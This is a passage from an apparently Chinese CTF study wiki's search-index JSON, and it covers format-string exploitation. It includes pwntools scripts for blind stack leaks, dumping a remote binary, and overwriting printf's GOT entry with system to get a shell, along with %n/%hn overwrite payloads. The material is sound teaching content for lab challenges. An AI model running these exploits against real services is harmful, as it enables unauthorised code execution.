\u7b26\u53f7\u53bb\u5b9a\u4f4d\u4ed6\uff1b\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u5b9a\u4f4d\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u7528 hn\\hhn \u7b49\u65b9\u5f0f\u53bb\u5199\u8fd9\u4e2a\u5730\u5740\uff0c\u53ea\u80fd\u7528 n \u65b9\u5f0f\u53bb\u5199\uff0c\u6240\u4ee5\u6253\u5370\u5f88\u591a\u3002 \u6ce8\u89e3 \uff1a \u6211\u7684\u811a\u672c\u4e2d\u7528\u7684\u4e0d\u662f system('/bin/sh') \uff0c\u800c\u662f system('sh') \uff0c\u8fd9\u662f\u56e0\u4e3a\u7528\u9898\u76ee\u63d0\u4f9b\u7684 libc \u641c\u7d22 /bin/sh \u5f97\u5230\u7ed3\u679c\u6709\u8bef\uff0c\u5f97\u5230\u7684\u5730\u5740\u4e0d\u662f /bin/sh \uff1a \u800c\u53bb\u5230 libcdatabase \u5f97\u5230\u7ed3\u679c\u662f\uff1a 0xf7f60a0b \uff0c\u91cc\u9762\u6709\u4e00\u4e2a 0x0a \u5c31\u662f\u6362\u884c\u7b26\u561b\uff0c\u8fd9\u6837\u4f1a\u63d0\u524d\u7ec8\u6b62\u8f93\u5165\uff0c\u6240\u4ee5\u4e5f\u4e0d\u884c\u3002\u6700\u540e\u4f7f\u7528\u9898\u76ee\u63d0\u4f9b libc \u641c\u7d22 sh \uff0c\u6210\u529f getshell \u3002 \u5728\u6211\u7684\u73af\u5883\uff08Ubuntu 16.04\uff09\u6ca1\u6709\u9047\u5230 system \\x00 \u963b\u65ad\uff0c\u6240\u4ee5 payload \u4e2d system \u524d\u7f6e\u3002\u5982\u679c\u9047\u5230\u963b\u65ad\uff0c\u5c31\u5c06 system \u540e\u7f6e\uff0c\u5e76\u8c03\u6574 ebp \u8986\u76d6\u5185\u5bb9\u52a0\u4e0a\u504f\u79fb\u5373\u53ef\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_30","text":"ctf-wiki \u4e0a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4ecb\u7ecd\u4e0d\u662f\u5f88\u5168\u9762\uff0c\u6211\u67e5\u4e86\u5176\u4ed6\u5927\u4f6c\u7684\u7b14\u8bb0\uff0c\u81ea\u5df1\u603b\u7ed3\u4e86\uff1a Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253"},{"location":"fmtstr/fmtstr_example/#_31","text":"\u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884c pwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#1-","text":"\u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939 fmt_blind_stack \u4e2d\u3002","title":"\u4f8b\u5b50 1 - \u6cc4\u9732\u6808"},{"location":"fmtstr/fmtstr_example/#_32","text":"\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86 %p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git:(master) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eec flag \u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"fmtstr/fmtstr_example/#_33","text":"\u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context.log_level = 'error' def leak(payload): sh = remote('127.0.0.1', 9999) sh.sendline(payload) data = sh.recvuntil('\\n', drop=True) if data.startswith('0x'): print p64(int(data, 16)) sh.close() i = 1 while 1: payload = '%{}$p'.format(i) leak(payload) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230 flag //////// //////// \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff flag{thi s_is_fla g}\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\xfe\\x7f\\x00\\x00","title":"\u5229\u7528"},{"location":"fmtstr/fmtstr_example/#2-got","text":"\u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728 blind_fmt_got \u6587\u4ef6\u5939\u4e2d\u3002","title":"\u4f8b\u5b50 2 - \u76f2\u6253\u52ab\u6301 got"},{"location":"fmtstr/fmtstr_example/#_34","text":"\u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a 64 \u4f4d\u3002 \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570"},{"location":"fmtstr/fmtstr_example/#_35","text":"\u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git:(master) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a 6\u3002","title":"\u786e\u5b9a\u504f\u79fb"},{"location":"fmtstr/fmtstr_example/#binary","text":"\u7531\u4e8e\u7a0b\u5e8f\u662f 64 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece 0x400000 \u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() getbinary() \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728 payload \u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709 '\\n' \u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002","title":"\u6cc4\u9732 binary"},{"location":"fmtstr/fmtstr_example/#binary_1","text":"\u5229\u7528 IDA \u6253\u5f00\u6cc4\u9732\u7684 binary \uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8f main \u51fd\u6570\u7684\u5730\u5740 seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [rbp-80h] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000:000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [rbp-80h] seg000:000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000:0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662f sub_4004C0 \u4e3a read \u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662f read \u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684 sub_4004B0 \u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a while 1 \u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 \u6ce8\u89e3\uff1a \u8865\u5145\u4e00\u5f20\u56fe","title":"\u5206\u6790 binary"},{"location":"fmtstr/fmtstr_example/#_36","text":"\u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94 libc \u4ee5\u53ca system \u51fd\u6570\u5730\u5740 \u4fee\u6539 printf \u5730\u5740\u4e3a system \u51fd\u6570\u5730\u5740 \u8bfb\u5165 /bin/sh; \u4ee5\u4fbf\u4e8e\u83b7\u53d6 shell","title":"\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_37","text":"\u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context.arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num += 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len(data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr += len(data) f.close() ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote(ip, port) ## let the read get resolved sh.sendline('a') sh.recv() ## get printf addr payload = '%00008$s' + 'STARTEND' + p64(read_got) sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\\x00') sh.recv() read_addr = u64(data) ## get system addr libc = LibcSearcher('read', read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') log.success('system addr: ' + hex(system_addr)) log.success('read addr: ' + hex(read_addr)) ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() ## get shell sh.sendline('/bin/sh;') sh.interactive() \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801 ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() fmtstr_payload \u76f4\u63a5\u5f97\u5230\u7684 payload \u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4 printf \u7684\u65f6\u5019 '\\x00' \u622a\u65ad\uff08 \u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools \u76ee\u524d\u6b63\u5728\u5f00\u53d1 fmt_payload \u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002 \uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u9762 8 \u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9 payload \u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f offset = (int)(math.ceil(len(payload) / 8.0) + 1) \u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e '%order$hn' \u4e2d order \u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e 8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_38","text":"SuCTF2018 - lock2 \uff08\u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2\uff09","title":"\u9898\u76ee"},{"location":"fmtstr/fmtstr_exploit/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 \u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3 \u6cc4\u9732\u5185\u5b58 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002 \u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001.22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\" \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n$p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002 \u5c0f\u603b\u7ed3 \u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48 \u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002 \u5173\u952e\u5b57\u9009\u62e9 \u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order$x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order$s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002 \u8986\u76d6\u5185\u5b58 \u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", &c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; } \u8986\u76d6\u4efb\u610f\u5730\u5740 \u8986\u76d6\u5c0f\u6570\u5b57 \u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002 \u600e\u4e48\u5bf9\u9f50 \u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len(\"aa%k$n\")%4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number. \u8986\u76d6\u5927\u6570\u5b57 \u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 